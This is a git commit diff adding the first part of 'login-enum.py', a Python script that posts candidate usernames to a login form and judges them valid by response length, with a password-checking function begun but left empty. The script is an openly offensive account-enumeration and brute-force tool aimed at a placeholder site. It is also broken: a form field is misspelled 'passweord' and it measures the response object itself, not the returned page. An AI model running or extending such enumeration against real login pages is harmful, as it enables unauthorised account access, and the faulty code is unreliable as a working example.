a904d16060f9d06da3ca928a0965ec6e08bfe3d2
Han <han@sinchan.local>
2025-05-24 17:09:45 +0800

    add username

--- login-enum.py
+++ login-enum.py
@@ -1,4 +1,24 @@
 import requests
 
 URL = "https://urlsite.com"
+USERNAME = "username.txt"
+PASSWORD = "password.txt"
+HEADERS = {
+    "Content-Type":"application/x-www-form-urlencoded"
+}
 
+def check_username(username):
+    data = {
+        "username": username,
+        "passweord": "password"
+    }
+    response = requests.post(URL,headers=HEADERS,data=data)
+    if len(response) >= 2986:
+        print (f"[v] USERNAME VALID")
+        return True
+    else:
+        print(f"[x] USERNAME TIDAK VALID")
+        return False
+
+def check_password(password):
+    
